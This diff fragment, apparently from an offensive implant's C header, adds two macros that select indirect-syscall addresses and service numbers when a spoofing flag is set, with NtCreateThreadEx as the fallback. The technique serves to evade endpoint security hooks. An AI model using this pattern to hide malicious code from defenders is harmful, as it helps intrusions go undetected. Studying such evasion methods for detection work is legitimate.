@@ -13,6 +13,16 @@
     }                                           \
 }
 
+#define SYS_ADDR( sys_id ) \
+    ( Flags == SYSCALL_SPOOF_INDIRECT )          \
+    ? (UPTR)Self->Sys->Ext[ sys_id ].Instruction \
+    : (UPTR)Self->Ntdll.NtCreateThreadEx
+
+#define SYS_SSN( sys_id ) \
+    (Flags == SYSCALL_SPOOF_INDIRECT)      \
+    ? (UPTR)Self->Sys->Ext[ sys_id ].ssn   \
+    : 0;
+
 /* ========= [ class macro ] ========= */
 #define MAX_RECEIVE_BUFFER (16 * 1024 * 1024) 
 #define max(a, b) (((a) > (b)) ? (a) : (b))
